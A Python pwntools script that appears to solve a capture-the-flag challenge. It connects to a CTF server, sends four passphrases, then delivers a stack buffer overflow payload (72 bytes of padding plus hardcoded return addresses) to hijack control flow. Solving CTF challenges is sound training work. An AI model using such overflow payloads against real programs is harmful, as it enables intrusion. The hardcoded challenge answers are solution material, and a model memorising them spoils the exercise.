from pwn import *

# Set up connection to the remote server
# host = "treasure-hunt.ctf.pearlctf.in"
# port = 30008

# # Create a remote connection
p = remote('treasure-hunt.ctf.pearlctf.in', 30008)

# p = process('./vuln')

# Variables for the steps before payload
one = "whisp3ring_w00ds"
two = "sc0rching_dunes"
three = "eldorian_ech0"
four = "shadow_4byss"

# Overflow address (example, replace with the correct one)
overflow = p64(0x00401207)
setelibility = p64(0x0040126c)

# Construct the payload (overwrite buffer)
payload = b'A' * (64 + 8)  # 64 for buffer + 8 for saved return address
payload += setelibility
payload += overflow

# Receive initial server prompt
p.recvline()

# Send the stages of the interaction
p.sendline(one)  # Send first step
p.recvline()  # Wait for the server's response

p.sendline(two)  # Send second step
p.recvline()  # Wait for response

p.sendline(three)  # Send third step
p.recvline()  # Wait for response

p.sendline(four)  # Send fourth step
p.recvline()  # Wait for response

# Send the payload
p.sendline(payload)

# Read the server's response
response = p.recvline()
print(response.decode())

# Keep the connection open for interaction if needed
p.interactive()  # This allows you to interact with the program, if necessary
